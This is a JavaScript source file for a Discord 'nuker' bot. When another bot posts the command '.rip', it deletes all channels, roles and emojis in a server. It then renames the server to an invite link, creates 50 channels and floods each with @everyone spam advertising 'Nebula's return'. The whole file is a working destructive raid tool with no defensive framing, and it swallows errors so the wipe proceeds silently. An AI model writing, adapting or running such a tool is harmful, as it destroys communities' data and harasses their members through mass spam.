const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const { loadEnvFile } = require('dotenv');
const fs = require('fs');

// Load environment variables
require('dotenv').config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.GuildEmojisAndStickers
    ]
});

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (message.content === '.rip' && message.author.bot) {
        const guild = message.guild;
        const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';

        // Delete all channels
        guild.channels.cache.forEach(async (channel) => {
            try {
                await channel.delete();
            } catch {}
        });

        // Delete all roles except @everyone
        guild.roles.cache.forEach(async (role) => {
            if (role.name !== '@everyone' && !role.managed) {
                try {
                    await role.delete();
                } catch {}
            }
        });

        // Delete all emojis
        guild.emojis.cache.forEach(async (emoji) => {
            try {
                await emoji.delete();
            } catch {}
        });

        // Rename server
        try {
            await guild.edit({ name: 'discord.gg/migh' });
        } catch {}

        // Wait for deletions to complete
        await new Promise(r => setTimeout(r, 1000));

        // Create 50 new channels
        let createdChannels = [];
        for (let i = 0; i < 50; i++) {
            try {
                const channel = await guild.channels.create({ name: 'neb-was-here' });
                createdChannels.push(channel);
            } catch {}
        }

        // Spam 20 messages in each channel
        createdChannels.forEach(async (channel) => {
            for (let i = 0; i < 20; i++) {
                try {
                    await channel.send(spamMessage);
                } catch {}
            }
        });

        try {
            await message.channel.send('💥 Server nuked.');
        } catch {}
    }
});

client.login(process.env.TOKEN);
